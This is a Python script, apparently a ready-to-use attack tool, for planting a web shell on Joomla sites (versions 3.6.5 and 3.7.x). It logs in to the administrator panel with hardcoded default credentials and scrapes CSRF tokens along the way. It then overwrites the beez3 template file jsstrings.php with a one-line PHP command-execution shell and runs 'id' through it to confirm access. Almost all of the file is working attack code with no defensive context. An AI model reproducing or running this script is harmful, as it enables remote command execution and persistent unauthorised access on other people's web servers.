#!/usr/bin/env python
# joomla_shellup.py - small script to upload shell in Joomla
#
# 02.05.2017, rewrited: 27.05
# -- hint --
# To exploit this "feature" you will need valid credentials.'
# Based on latest (3.6.5-1) version.'
#   Tested also on: 3.7.x
# 首先要知道username和passwd，然后要以http://xxxxx.xxxx的方式

import requests
import re

target = raw_input("[+] Hostname >> ")

print '[+] Checking: ' + str(target)

# initGET
session = requests.session()
initlink = target + '/administrator/index.php'

initsend = session.get(initlink)
initresp = initsend.text

find_token = re.compile('[a-fA-F0-9]{32}')
found_token = re.findall(find_token, initresp)


if found_token:
  initToken = found_token[-1]
  print '[+] Found init token: ' + initToken

  print '[+] Preparing login request'
  data_login = {
        'username':'admin',
        'passwd':'adminadmin',
        'lang':'',
        'option':'com_login',
        'task':'login',
        'return':'aW5kZXgucGhw',
        initToken:'1'
  }
  data_link = initlink
  doLogin = session.post(data_link, data=data_login)
  loginResp = doLogin.text


  print '[+] At this stage we should be logged-in as an admin :)'

  uplink = target + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D'
  filename = 'jsstrings.php'
  print '[+] File to change: ' + str(filename)

  getnewtoken = session.get(uplink)
  getresptoken = getnewtoken.text

  newToken = re.compile('[a-fA-F0-9]{32}')
  newFound = re.findall(newToken, getresptoken)


  if newFound:
    newOneTok = newFound[-1]
    print '[+] Grabbing new token from logged-in user: ' + newOneTok

    getjs = target+'/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D'
    getjsreq = session.get(getjs)
    getjsresp = getjsreq.text

    # print getjsresp
    print '[+] Shellname: ' + filename
    shlink = target + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA='
    shdata_up = {
        'jform[source]':'<?php system($_GET["x"]);',
        'task':'template.apply',
        newOneTok:'1',
        'jform[extension_id]':'503',
        'jform[filename]':'/'+filename
    }
    shreq = session.post(shlink, data=shdata_up)
    path2shell = '/templates/beez3/jsstrings.php?x=id'
    print '[+] Shell is ready to use: ' + str(path2shell)
    print '[+] Checking:'
    shreq = session.get(target + path2shell)
    shresp = shreq.text

    print shresp

print '\n[+] Module finished.'